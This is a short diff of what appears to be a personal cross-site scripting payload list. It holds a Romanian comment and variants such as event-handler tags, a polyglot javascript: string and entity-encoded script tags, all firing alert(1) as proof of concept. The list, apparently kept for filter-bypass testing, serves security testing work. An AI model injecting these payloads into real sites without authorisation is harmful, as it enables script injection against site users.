@@ -1,4 +1,3 @@
-<script>alert(1)</script>
 <object data = "data:text/html,<script>alert(1)</script>">
 <input autofocus onfocus=alert(1)>  asta cred ca merge la persistent fara autofocus
 javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
@@ -14,6 +13,5 @@ javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onm
 <style>@keyframes x{}</style><p style="animation-name:x" onanimationend="alert(1)"></p>
 
 <svg><script>&#97;lert(1)</script></svg>
-<svg><script>&#x61;lert(1)</script></svg>
 <svg><script>alert&NewLine;(1)</script></svg>
 <svg><script>x="&quot;,alert(1)//";</script></svg>
